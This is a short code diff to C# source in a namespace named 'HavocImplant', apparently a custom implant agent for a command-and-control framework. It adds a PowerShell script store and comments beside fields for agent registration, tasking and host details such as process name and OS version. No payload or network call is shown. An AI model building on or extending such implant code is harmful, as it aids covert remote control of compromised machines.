@@ -30,7 +30,8 @@ namespace HavocImplant
         public byte[] magic = new byte[] { 0x41, 0x41, 0x41, 0x42 };
         public byte[] agentId = Encoding.ASCII.GetBytes(new Random().Next(1000, 10000).ToString());
         public bool registered;
-
+        
+        // Tasking
         public Dictionary<int, task> taskingInformation = new Dictionary<int, task>();
         public struct task
         {
@@ -59,10 +60,13 @@ namespace HavocImplant
         public string processName = Process.GetCurrentProcess().ProcessName;
         public string osVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
 
-
+        // A list of instances of each command (so we can do "generic" handling)
         public static List<CommandInterface> Commands = new List<CommandInterface>();
 
-        static async Task Main() // Looping through tasks and stuff
+        // Powershell stuff (scriptname, asciiContents)
+        public Dictionary<string, string>PSScripts= new Dictionary<string, string>();
+
+        public static async Task Main() // Looping through tasks and stuff
         {
 
             RunPatches();
